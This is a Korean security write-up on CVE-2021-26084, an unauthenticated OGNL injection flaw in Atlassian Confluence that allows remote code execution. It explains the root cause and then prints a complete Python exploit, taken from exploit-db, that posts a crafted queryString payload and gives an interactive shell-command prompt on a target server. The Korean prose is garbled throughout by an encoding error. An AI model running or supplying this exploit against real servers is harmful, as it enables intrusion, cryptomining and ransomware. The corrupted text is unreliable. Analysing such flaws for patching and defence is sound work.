# Atlassian Confluence ì›ê²©ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì 

### Author

---

ê¹€ìˆœìš±

### Date

---

2021.08.25

### Summary

---

êµ­ë‚´ì™¸ ë‹¤ìˆ˜ ê¸°ì—…ì—ì„œ ì‚¬ìš©í•˜ëŠ” í˜‘ì—… í”Œëž«í¼ì¸ **Atlassian Confluence**ì—ì„œ **ì›ê²©ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì **(`CVE-2021â€“26084`)ì´ ë°œê²¬ë˜ì—ˆë‹¤. **OGNL ì¸ì ì…˜**ì„ í†µí•´ ì¸ì¦ë˜ì§€ ì•Šì€ ì‚¬ìš©ìžê°€ Confluence ì„œë²„ ë° ë°ì´í„° ì„¼í„°ì—ì„œ ìž„ì˜ ì½”ë“œë¥¼ ì‹¤í–‰(**RCE**)í•  ìˆ˜ ìžˆëŠ”ë°, ê³µê²© ì‹œë„ ì‹œ ì‚¬ìš©ìž ì¸ì¦ê³¼ ê°™ì€ ì œì•½ì¡°ê±´ì´ ì—†ì–´ ì·¨ì•½ì ì´ ì‰½ê²Œ ìŠ¤ìºë‹ë  ìˆ˜ ìžˆì—ˆë‹¤.   Confluence ì„œë²„ ë° Confluence Data Center ì†Œí”„íŠ¸ì›¨ì–´ì— ì˜í–¥ì„ ë¯¸ì¹˜ë©°, Atlassianì—ì„œëŠ” ì·¨ì•½ì  íŒ¨ì¹˜ì™€ í•¨ê»˜ ì·¨ì•½ì  ì™„í™” ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì œê³µí–ˆë‹¤. CVSS(v3) **9.8**ì ìœ¼ë¡œ ë°œí‘œë˜ì—ˆë‹¤.

### Keywords

---

#CVE-2021â€“26084 #Atlassian #Confluence #Remote_Code_Execution_Vulnerability #OGNL_Injection

### Root Cause

---

**Confluence**ëŠ” Webwork ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í•˜ì—¬ Velocity í…œí”Œë¦¿ì—ì„œ ì›¹ íŽ˜ì´ì§€ ì½˜í…ì¸ ë¥¼ ë™ì ìœ¼ë¡œ ìƒì„±í•˜ê¸° ìœ„í•´ **[OGNL** í‘œí˜„ì‹](https://ko.wikipedia.org/wiki/OGNL)ì„ ì‚¬ìš©í•œë‹¤. Velocity í…œí”Œë¦¿ì´ íŽ˜ì´ì§€ì— ë Œë”ë  ë•Œ OGNL êµ¬ë¬¸ì´ í•´ì„ë˜ëŠ”ë°, ì´ë•Œ ì‚¬ìš©ìžì˜ ìž…ë ¥ê°’ì˜ ìœ íš¨ì„±ì„ ì¶©ë¶„ížˆ ê²€ì‚¬í•˜ì§€ ì•Šì•„ ìž…ë ¥ê°’ì´ í…œí”Œë¦¿ì—ì„œ OGNL êµ¬ë¬¸ìœ¼ë¡œ í•´ì„ë  ìˆ˜ ìžˆë‹¤. ê³µê²©ìžëŠ” ì´ë¥¼ ì•…ìš©í•˜ì—¬ Confluence ì„œë²„ì— ì•…ì˜ì ì¸ **OGNL êµ¬ë¬¸ì„ ì‚½ìž…**í•˜ì—¬ **ìž„ì˜ ì½”ë“œë¥¼ ì‹¤í–‰**í•  ìˆ˜ ìžˆë‹¤.

Velocity í…œí”Œë¦¿ì˜ OGNL í‘œí˜„ì‹ì€ `ognl.OgnlParser.expression()` ë©”ì„œë“œë¥¼ ì‚¬ìš©í•˜ëŠ”ë°, ìž…ë ¥ ë¬¸ìžì—´ì„ ê¸°ë°˜ìœ¼ë¡œ ì¼ë ¨ì˜ í† í°ìœ¼ë¡œ íŒŒì‹±í•œë‹¤.  OGNL êµ¬ë¬¸ ë¶„ì„ê¸°ì—ì„œ í˜¸ì¶œí•˜ëŠ” `ognl.JavaCharStream.readChar()` ë©”ì„œë“œëŠ” *â€œ\uXXXXâ€* í˜•ì‹ì„ ìœ ë‹ˆì½”ë“œ ì´ìŠ¤ì¼€ì´í”„ ë¬¸ìžë¡œ í•´ì„í•˜ë©°, ì´ë•Œ *â€œXXXXâ€*ëŠ” ìœ ë‹ˆì½”ë“œ ë¬¸ìžì˜ 16ì§„ìˆ˜ ì½”ë“œë‹¤. ë”°ë¼ì„œ ì‹ì„ ***â€œ\u0027â€*** ë¬¸ìžë¡œ í¬í•¨í•˜ë©´ ì´ëŠ” **ë”°ì˜´í‘œ(â€™)**ë¡œ í•´ì„ë˜ì–´ ë¬¸ìžì—´ ë¦¬í„°ëŸ´ë¡œì¨ í‰ê°€ì—ì„œ ë²—ì–´ë‚˜ ìž„ì˜ì˜ OGNL ì‹ì„ ì¶”ê°€í•  ìˆ˜ ìžˆë‹¤. ì¦‰, OGNL í‘œí˜„ì‹ì´ ë‹¨ì¼ ë”°ì˜´í‘œ ìŒ ë‚´ì— Velocity í…œí”Œë¦¿ì—ì„œ íŒŒì‹±ë˜ê³  í‘œí˜„ì‹ì˜ ê°’ì´ ì‚¬ìš©ìž ìž…ë ¥ìœ¼ë¡œë¶€í„° ì–»ì–´ì§€ë©´ ìž„ì˜ì˜ OGNL ìˆ˜ì‹ì´ ì£¼ìž…ë  ìˆ˜ ìžˆë‹¤.

ì—¬ê¸°ì„œ ì‚¬ìš©ìž ìž…ë ¥ì— ëŒ€í•œ ì¶©ë¶„í•œ **ìœ íš¨ì„± ê²€ì‚¬ì˜ ë¶€ì¡±**ìœ¼ë¡œ ì¸í•´ **OGNL ì¸ì ì…˜** ì·¨ì•½ì ì´ ë°œìƒí•œë‹¤. *â€œ\u0027â€* ë¬¸ìžë¥¼ í¬í•¨í•¨ìœ¼ë¡œì¨ ê³µê²©ìžëŠ” ë¬¸ìžì—´ ë¦¬í„°ëŸ´ì„ íƒˆì¶œí•˜ê³  ìž„ì˜ì˜ OGNL ì‹ì„ ì¶”ê°€í•  ìˆ˜ ìžˆê²Œ ë˜ëŠ” ê²ƒì´ë‹¤.

ë˜í•œ OGNL í‘œí˜„ì‹ì€ Webworkì— ì˜í•´ í‰ê°€ë˜ê¸° ì „ì— `com.opensymphony.webwork.util.SafeExpressionUtil.containsUnsafeExpression()` ë©”ì„œë“œì—ì„œ ì•ˆì „í•˜ì§€ ì•Šì€ ë…¸ë“œ ìœ í˜•, ì†ì„± ì´ë¦„, ë©”ì„œë“œ ì´ë¦„ ë° ë³€ìˆ˜ ì´ë¦„ ë¦¬ìŠ¤íŠ¸ì™€ ë¹„êµëœë‹¤. í•˜ì§€ë§Œ ì´ ë¦¬ìŠ¤íŠ¸ê°€ ì™„ì „í•˜ì§€ ì•Šìœ¼ë©°, ë‚˜ì—´ëœ ìš”ì†Œë¥¼ ì‚¬ìš©í•˜ì§€ ì•Šê³ ë„ ìž„ì˜ì˜ Java ê°œì²´ë¥¼ ì¸ìŠ¤í„´ìŠ¤í™” í•  ìˆ˜ ìžˆë‹¤.

ì´ë¥¼ ì´ìš©í•´ ì›ê²© ê³µê²©ìžëŠ” ì•…ì˜ì ì¸ íŒŒë¼ë¯¸í„°ë¥¼ í¬í•¨í•˜ëŠ” ì¡°ìž‘ëœ HTTP ìš”ì²­ì„ ì·¨ì•½í•œ ì„œë²„ë¡œ ì „ì†¡í•  ìˆ˜ ìžˆê³ , ì´ ê³µê²©ì´ ì„±ê³µí•˜ë©´ ì„œë²„ì˜ ê¶Œí•œìœ¼ë¡œ **ìž„ì˜ ì½”ë“œê°€ ì‹¤í–‰**(RCE)ë  ìˆ˜ ìžˆë‹¤.

### Exploit

---

Atlassian íŒ¨ì¹˜ê°€ ë°œí‘œëœ í›„, PoC ìµìŠ¤í”Œë¡œìž‡ì´ ê³µê°œë˜ë©´ì„œ ì—¬ëŸ¬ ê³µê²©ìžë“¤ì´ ì´ ì·¨ì•½ì ì— ì·¨ì•½í•œ ì„œë²„ë¥¼ ëŒ€ìƒìœ¼ë¡œ ì•”í˜¸í™”í ì±„êµ´ê¸°ë¥¼ ì„¤ì¹˜í•˜ê¸° ì‹œìž‘í–ˆë‹¤. ë˜í•œ ëžœì„¬ì›¨ì–´ë¥¼ ë¹„ë¡¯í•œ ë‹¤ì–‘í•œ ì‚¬ì´ë²„ ê³µê²©ì—ë„ ì•…ìš©í•  ìˆ˜ ìžˆì–´ ë¯¸êµ­ ì‚¬ì´ë²„ ì‚¬ë ¹ë¶€(USCYBERCOM)ì—ì„œëŠ” ì´ ì·¨ì•½ì ì— ëŒ€í•´ ì¦‰ì‹œ íŒ¨ì¹˜í•˜ë¼ê³  ê²½ê³ í•˜ê¸°ë„ í–ˆë‹¤. 

[exploit-db](https://www.exploit-db.com/exploits/50243)ì—ì„œ íŒŒì´ì¬ìœ¼ë¡œ ìž‘ì„±í•œ exploit ì½”ë“œë¥¼ í™•ì¸í•  ìˆ˜ ìžˆëŠ”ë°, ë‹¤ìŒê³¼ ê°™ë‹¤.

```python
import requests
from bs4 import BeautifulSoup
import optparse

parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="Base target host: http://confluencexxx.com")
parser.add_option('-p', '--path', action="store", dest="path", help="Path to exploitation: /pages/createpage-entervariables.action?SpaceKey=x")

options, args = parser.parse_args()
session = requests.Session()

url_vuln = options.url
endpoint = options.path

if not options.url or not options.path:

    print('[+] Specify an url target')
    print('[+] Example usage: exploit.py -u http://xxxxx.com -p /pages/createpage-entervariables.action?SpaceKey=x')
    print('[+] Example help usage: exploit.py -h')
    exit()

def banner():

    print('---------------------------------------------------------------')
    print('[-] Confluence Server Webwork OGNL injection')
    print('[-] CVE-2021-26084')
    print('[-] https://github.com/h3v0x')
    print('--------------------------------------------------------------- \n')

def cmdExec():

    while True:
        cmd = input('> ')
        xpl_url = url_vuln + endpoint
        xpl_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36", "Connection": "close", "Content-Type": "application/x-www-form-urlencoded", "Accept-Encoding": "gzip, deflate"}
        xpl_data = {"queryString": "aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022"+cmd+"\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027"}
        rawHTML = session.post(xpl_url, headers=xpl_headers, data=xpl_data)

        soup = BeautifulSoup(rawHTML.text, 'html.parser')
        queryStringValue = soup.find('input',attrs = {'name':'queryString', 'type':'hidden'})['value']
        print(queryStringValue)

banner()
cmdExec()
```

### References

---

[NVD - CVE-2021-26084](https://nvd.nist.gov/vuln/detail/CVE-2021-26084)

[Confluence Security Advisory - 2021-08-25 | Confluence Data Center 8.8 | Atlassian Documentation](https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html)

[atlassian](https://jira.atlassian.com/browse/CONFSERVER-67940)

[Zero Day Initiative â€” CVE-2021-26084: Details on the Recently Exploited Atlassian Confluence OGNL Injection Bug](https://www.zerodayinitiative.com/blog/2021/9/21/cve-2021-26084-details-on-the-recently-exploited-atlassian-confluence-ognl-injection-bug)

[2021 HotðŸ”¥ ë³´ì•ˆ ì‚¬ê±´ ì‚¬ê³ â€Šâ€”â€Ší•˜ë°˜ê¸°](https://medium.com/theori-blog/2021-hot-cve-the-second-half-23eb5c45e35c)

[github](https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md)